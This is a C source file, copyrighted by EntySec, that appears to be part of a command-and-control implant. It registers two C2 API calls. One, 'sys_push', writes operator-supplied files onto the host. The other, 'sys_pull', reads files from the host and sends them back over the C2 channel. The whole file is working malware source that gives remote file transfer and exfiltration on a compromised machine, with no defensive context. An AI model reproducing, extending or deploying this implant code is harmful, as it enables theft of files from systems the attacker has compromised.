/*
 * MIT License
 *
 * Copyright (c) 2020-2023 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#include "c2.h"
#include "tlv.h"

static c2_api_call_t *sys_push(tlv_transport_pkt_t tlv_transport_packet)
{
    tlv_transport_pkt_t tlv_arg_no1 = tlv_transport_channel_read(
        tlv_transport_packet.tlv_transport_pkt_channel, 1);
    tlv_transport_pkt_t tlv_arg_no2 = tlv_transport_channel_read(
        tlv_transport_packet.tlv_transport_pkt_channel, 1);

    tlv_transport_file_t tlv_transport_file_new = {
        .tlv_transport_file_to = tlv_arg_no1.tlv_transport_pkt_data,
        .tlv_transport_file_from = tlv_arg_no2.tlv_transport_pkt_data,
    };

    if (tlv_transport_channel_read_file(tlv_transport_packet, tlv_transport_file_new) < 0)
    {
        tlv_transport_pkt_free(tlv_arg_no1);
        tlv_transport_pkt_free(tlv_arg_no2);

        return craft_c2_api_call_pkt(tlv_transport_packet, API_CALL_RW_ERROR, "");
    }

    tlv_transport_pkt_free(tlv_arg_no1);
    tlv_transport_pkt_free(tlv_arg_no2);

    return NULL;
}

static c2_api_call_t *sys_pull(tlv_transport_pkt_t tlv_transport_packet)
{
    tlv_transport_pkt_t tlv_arg_no1 = tlv_transport_channel_read(
        tlv_transport_packet.tlv_transport_pkt_channel, 1);
    tlv_transport_pkt_t tlv_arg_no2 = tlv_transport_channel_read(
        tlv_transport_packet.tlv_transport_pkt_channel, 1);

    tlv_transport_file_t tlv_transport_file_new = {
        .tlv_transport_file_to = tlv_arg_no1.tlv_transport_pkt_data,
        .tlv_transport_file_from = tlv_arg_no2.tlv_transport_pkt_data,
    };

    if (tlv_transport_channel_send_file(tlv_transport_packet, tlv_transport_file_new) < 0)
    {
        tlv_transport_pkt_free(tlv_arg_no1);
        tlv_transport_pkt_free(tlv_arg_no2);

        return craft_c2_api_call_pkt(tlv_transport_packet, API_CALL_RW_ERROR, "");
    }

    tlv_transport_pkt_free(tlv_arg_no1);
    tlv_transport_pkt_free(tlv_arg_no2);

    return craft_c2_api_call_pkt(tlv_transport_packet, API_CALL_SUCCESS, "");
}

void register_sys_api_calls(c2_api_calls_t **c2_api_calls_table)
{
    c2_register_api_call(c2_api_calls_table, API_CALL, sys_push, API_SCOPE_STDAPI);
    c2_register_api_call(c2_api_calls_table, API_CALL + 1, sys_pull, API_SCOPE_STDAPI);
}